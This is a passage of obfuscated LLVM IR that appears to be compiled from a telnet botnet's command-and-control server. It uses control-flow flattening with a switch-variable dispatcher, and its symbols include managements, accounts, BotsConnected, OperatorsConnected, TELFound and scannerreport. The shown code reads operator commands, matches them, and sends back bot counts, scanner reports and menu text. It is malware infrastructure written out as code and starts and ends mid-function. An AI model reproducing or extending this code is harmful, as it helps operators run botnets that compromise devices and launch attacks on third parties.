  %233 = load i32, i32* %4, align 4
  %234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %236 = call i64 @strlen(i8* %235) #8
  %237 = call i64 @send(i32 %233, i8* %234, i64 %236, i32 16384)
  %238 = icmp eq i64 %237, -1
  %239 = select i1 %238, i32 1180252662, i32 1194840686
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = load i32, i32* %4, align 4
  %243 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %244 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %245 = call i64 @strlen(i8* %244) #8
  %246 = call i64 @send(i32 %242, i8* %243, i64 %245, i32 16384)
  %247 = icmp eq i64 %246, -1
  %248 = select i1 %247, i32 1148891080, i32 507647735
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %4, align 4
  %252 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %254 = call i64 @strlen(i8* %253) #8
  %255 = call i64 @send(i32 %251, i8* %252, i64 %254, i32 16384)
  %256 = icmp eq i64 %255, -1
  %257 = select i1 %256, i32 -1484120794, i32 -657352573
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i32, i32* %4, align 4
  %261 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %262 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %263 = call i64 @strlen(i8* %262) #8
  %264 = call i64 @send(i32 %260, i8* %261, i64 %263, i32 16384)
  %265 = icmp eq i64 %264, -1
  %266 = select i1 %265, i32 282661473, i32 -1018746327
  store i32 %266, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i32, i32* %4, align 4
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %271 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %272 = call i64 @strlen(i8* %271) #8
  %273 = call i64 @send(i32 %269, i8* %270, i64 %272, i32 16384)
  %274 = icmp eq i64 %273, -1
  %275 = select i1 %274, i32 -2006799484, i32 367987006
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i32, i32* %4, align 4
  %279 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %280 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %281 = call i64 @strlen(i8* %280) #8
  %282 = call i64 @send(i32 %278, i8* %279, i64 %281, i32 16384)
  %283 = icmp eq i64 %282, -1
  %284 = select i1 %283, i32 -824342281, i32 208058654
  store i32 %284, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i32, i32* %4, align 4
  %288 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %289 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %290 = call i64 @strlen(i8* %289) #8
  %291 = call i64 @send(i32 %287, i8* %288, i64 %290, i32 16384)
  %292 = icmp eq i64 %291, -1
  %293 = select i1 %292, i32 175008985, i32 262346526
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %4, align 4
  %297 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %298 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %299 = call i64 @strlen(i8* %298) #8
  %300 = call i64 @send(i32 %296, i8* %297, i64 %299, i32 16384)
  %301 = icmp eq i64 %300, -1
  %302 = select i1 %301, i32 282571259, i32 -2008132619
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  store i32 1561048898, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %4, align 4
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %309 = call i64 @strlen(i8* %308) #8
  %310 = call i64 @send(i32 %306, i8* %307, i64 %309, i32 16384)
  %311 = icmp eq i64 %310, -1
  %312 = select i1 %311, i32 1214681945, i32 573167261
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* %4, align 4
  %316 = call i64 @send(i32 %315, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %317 = icmp eq i64 %316, -1
  %318 = select i1 %317, i32 -1867820169, i32 1222667240
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  store i32 984919137, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = load i8*, i8** %3, align 8
  %323 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %322) #7
  %324 = load i32, i32* %4, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %325
  %327 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %326, i32 0, i32 0
  store i32 1, i32* %327, align 4
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %330 = load i32, i32* %4, align 4
  %331 = call i32 @fdgets(i8* %329, i32 2048, i32 %330)
  %332 = icmp sgt i32 %331, 0
  %333 = select i1 %332, i32 571474483, i32 -682532426
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %337 = icmp ne i8* %336, null
  %338 = select i1 %337, i32 -1591416838, i32 -588624411
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %340, i8 0, i64 2048, i32 16, i1 false)
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %342 = call i32 @BotsConnected()
  %343 = load volatile i32, i32* @OperatorsConnected, align 4
  %344 = call i32 (i8*, i8*, ...) @sprintf(i8* %341, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.39, i32 0, i32 0), i32 %342, i32 %343) #7
  %345 = load i32, i32* %4, align 4
  %346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %348 = call i64 @strlen(i8* %347) #8
  %349 = call i64 @send(i32 %345, i8* %346, i64 %348, i32 16384)
  %350 = icmp eq i64 %349, -1
  %351 = select i1 %350, i32 -1610634910, i32 1877745943
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -885566018, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i32, i32* %4, align 4
  %355 = call i64 @send(i32 %354, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %356 = icmp eq i64 %355, -1
  %357 = select i1 %356, i32 -669671716, i32 -70203003
  store i32 %357, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %362 = call i8* @strstr(i8* %361, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #8
  %363 = icmp ne i8* %362, null
  %364 = select i1 %363, i32 -802458668, i32 -1919100471
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %366, i8 0, i64 2048, i32 16, i1 false)
  %367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %368 = load volatile i32, i32* @TELFound, align 4
  %369 = load volatile i32, i32* @scannerreport, align 4
  %370 = call i32 (i8*, i8*, ...) @sprintf(i8* %367, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i32 %368, i32 %369) #7
  %371 = load i32, i32* %4, align 4
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %374 = call i64 @strlen(i8* %373) #8
  %375 = call i64 @send(i32 %371, i8* %372, i64 %374, i32 16384)
  %376 = icmp eq i64 %375, -1
  %377 = select i1 %376, i32 382390840, i32 777569654
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -885566018, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i32, i32* %4, align 4
  %381 = call i64 @send(i32 %380, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %382 = icmp eq i64 %381, -1
  %383 = select i1 %382, i32 -1709050752, i32 1441766167
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %388 = call i8* @strstr(i8* %387, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0)) #8
  %389 = icmp ne i8* %388, null
  %390 = select i1 %389, i32 1671136577, i32 673677751
  store i32 %390, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i8*, i8** %3, align 8
  %393 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %392) #7
  %394 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %395 = load i32, i32* %5, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %396
  %398 = getelementptr inbounds %struct.login_info, %struct.login_info* %397, i32 0, i32 0
  %399 = getelementptr inbounds [20 x i8], [20 x i8]* %398, i32 0, i32 0
  %400 = call i32 (i8*, i8*, ...) @sprintf(i8* %394, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i32 0, i32 0), i8* %399) #7
  %401 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %402 = call i32 (i8*, i8*, ...) @sprintf(i8* %401, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0)) #7
  %403 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %404 = call i32 (i8*, i8*, ...) @sprintf(i8* %403, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i32 0, i32 0)) #7
  %405 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %406 = call i32 (i8*, i8*, ...) @sprintf(i8* %405, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i32 0, i32 0)) #7
  %407 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %408 = call i32 (i8*, i8*, ...) @sprintf(i8* %407, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i32 0, i32 0)) #7
  %409 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %410 = call i32 (i8*, i8*, ...) @sprintf(i8* %409, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %411 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %412 = call i32 (i8*, i8*, ...) @sprintf(i8* %411, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0)) #7
  %413 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %414 = call i32 (i8*, i8*, ...) @sprintf(i8* %413, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %415 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %416 = call i32 (i8*, i8*, ...) @sprintf(i8* %415, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i32 0, i32 0)) #7
  %417 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %418 = call i32 (i8*, i8*, ...) @sprintf(i8* %417, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i32 0, i32 0)) #7
  %419 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %420 = call i32 (i8*, i8*, ...) @sprintf(i8* %419, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i32 0, i32 0)) #7
  %421 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %422 = call i32 (i8*, i8*, ...) @sprintf(i8* %421, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i32 0, i32 0)) #7
  %423 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %424 = call i32 (i8*, i8*, ...) @sprintf(i8* %423, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i32 0, i32 0)) #7
  %425 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %426 = call i32 (i8*, i8*, ...) @sprintf(i8* %425, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i32 0, i32 0)) #7
  %427 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %428 = call i32 (i8*, i8*, ...) @sprintf(i8* %427, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i32 0, i32 0)) #7
  %429 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %430 = call i32 (i8*, i8*, ...) @sprintf(i8* %429, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %431 = load i32, i32* %4, align 4
  %432 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %433 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %434 = call i64 @strlen(i8* %433) #8
  %435 = call i64 @send(i32 %431, i8* %432, i64 %434, i32 16384)
  %436 = icmp eq i64 %435, -1
  %437 = select i1 %436, i32 -1139839593, i32 271366350
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i32, i32* %4, align 4
  %441 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %442 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %443 = call i64 @strlen(i8* %442) #8
  %444 = call i64 @send(i32 %440, i8* %441, i64 %443, i32 16384)
  %445 = icmp eq i64 %444, -1
  %446 = select i1 %445, i32 744563783, i32 -1438641444
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %4, align 4
  %450 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %451 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %452 = call i64 @strlen(i8* %451) #8
  %453 = call i64 @send(i32 %449, i8* %450, i64 %452, i32 16384)
  %454 = icmp eq i64 %453, -1
  %455 = select i1 %454, i32 -1118271949, i32 -394554014
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = load i32, i32* %4, align 4
  %459 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %460 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %461 = call i64 @strlen(i8* %460) #8
  %462 = call i64 @send(i32 %458, i8* %459, i64 %461, i32 16384)
  %463 = icmp eq i64 %462, -1
  %464 = select i1 %463, i32 -1561474736, i32 -1049881860
  store i32 %464, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i32, i32* %4, align 4
  %468 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %469 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %470 = call i64 @strlen(i8* %469) #8
  %471 = call i64 @send(i32 %467, i8* %468, i64 %470, i32 16384)
  %472 = icmp eq i64 %471, -1
  %473 = select i1 %472, i32 -108010706, i32 915557389
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i32, i32* %4, align 4
  %477 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %478 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %479 = call i64 @strlen(i8* %478) #8
  %480 = call i64 @send(i32 %476, i8* %477, i64 %479, i32 16384)
  %481 = icmp eq i64 %480, -1
  %482 = select i1 %481, i32 -966656365, i32 300968012
  store i32 %482, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i32, i32* %4, align 4
  %486 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %487 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %488 = call i64 @strlen(i8* %487) #8
  %489 = call i64 @send(i32 %485, i8* %486, i64 %488, i32 16384)
  %490 = icmp eq i64 %489, -1
  %491 = select i1 %490, i32 -1502277176, i32 -1165067647
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = load i32, i32* %4, align 4
  %495 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %496 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %497 = call i64 @strlen(i8* %496) #8
  %498 = call i64 @send(i32 %494, i8* %495, i64 %497, i32 16384)
  %499 = icmp eq i64 %498, -1
  %500 = select i1 %499, i32 854007555, i32 -834500158
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i32, i32* %4, align 4
  %504 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %505 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %506 = call i64 @strlen(i8* %505) #8
  %507 = call i64 @send(i32 %503, i8* %504, i64 %506, i32 16384)
  %508 = icmp eq i64 %507, -1
  %509 = select i1 %508, i32 -756797605, i32 1018982168
  store i32 %509, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %4, align 4
  %513 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %515 = call i64 @strlen(i8* %514) #8
  %516 = call i64 @send(i32 %512, i8* %513, i64 %515, i32 16384)
  %517 = icmp eq i64 %516, -1
  %518 = select i1 %517, i32 -905770401, i32 271757225
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i32, i32* %4, align 4
  %522 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %523 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %524 = call i64 @strlen(i8* %523) #8
  %525 = call i64 @send(i32 %521, i8* %522, i64 %524, i32 16384)
  %526 = icmp eq i64 %525, -1
  %527 = select i1 %526, i32 382602142, i32 -505100064
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %530 = load i32, i32* %4, align 4
  %531 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %532 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %533 = call i64 @strlen(i8* %532) #8
  %534 = call i64 @send(i32 %530, i8* %531, i64 %533, i32 16384)
  %535 = icmp eq i64 %534, -1
  %536 = select i1 %535, i32 1361008621, i32 -1342103423
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i32, i32* %4, align 4
  %540 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %541 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %542 = call i64 @strlen(i8* %541) #8
  %543 = call i64 @send(i32 %539, i8* %540, i64 %542, i32 16384)
  %544 = icmp eq i64 %543, -1
  %545 = select i1 %544, i32 788680319, i32 137247968
  store i32 %545, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i32, i32* %4, align 4
  %549 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %550 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %551 = call i64 @strlen(i8* %550) #8
  %552 = call i64 @send(i32 %548, i8* %549, i64 %551, i32 16384)
  %553 = icmp eq i64 %552, -1
  %554 = select i1 %553, i32 -1946284435, i32 -88750752
  store i32 %554, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i32, i32* %4, align 4
  %558 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %559 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %560 = call i64 @strlen(i8* %559) #8
  %561 = call i64 @send(i32 %557, i8* %558, i64 %560, i32 16384)
  %562 = icmp eq i64 %561, -1
  %563 = select i1 %562, i32 1973352774, i32 353588475
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i32, i32* %4, align 4
  %567 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %568 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %569 = call i64 @strlen(i8* %568) #8
  %570 = call i64 @send(i32 %566, i8* %567, i64 %569, i32 16384)
  %571 = icmp eq i64 %570, -1
  %572 = select i1 %571, i32 764111596, i32 1847025300
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = load i32, i32* %4, align 4
  %576 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %577 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %578 = call i64 @strlen(i8* %577) #8
  %579 = call i64 @send(i32 %575, i8* %576, i64 %578, i32 16384)
  %580 = icmp eq i64 %579, -1
  %581 = select i1 %580, i32 2091317294, i32 -748877188
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i8*, i8** %3, align 8
  %585 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %584) #7
  %586 = load i32, i32* %4, align 4
  %587 = call i64 @send(i32 %586, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %588 = icmp eq i64 %587, -1
  %589 = select i1 %588, i32 -971962994, i32 -1995128486
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:591:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %594 = call i8* @strstr(i8* %593, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i32 0, i32 0)) #8
  %595 = icmp ne i8* %594, null
  %596 = select i1 %595, i32 11937806, i32 -641383057
  store i32 %596, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i8*, i8** %3, align 8
  %599 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %598) #7
  %600 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %601 = call i32 (i8*, i8*, ...) @sprintf(i8* %600, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.58, i32 0, i32 0)) #7
  %602 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %603 = call i32 (i8*, i8*, ...) @sprintf(i8* %602, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.59, i32 0, i32 0)) #7
  %604 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %605 = call i32 (i8*, i8*, ...) @sprintf(i8* %604, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.60, i32 0, i32 0)) #7
  %606 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %607 = call i32 (i8*, i8*, ...) @sprintf(i8* %606, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.61, i32 0, i32 0)) #7
  %608 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %609 = call i32 (i8*, i8*, ...) @sprintf(i8* %608, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.62, i32 0, i32 0)) #7
  %610 = load i32, i32* %4, align 4
  %611 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %612 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
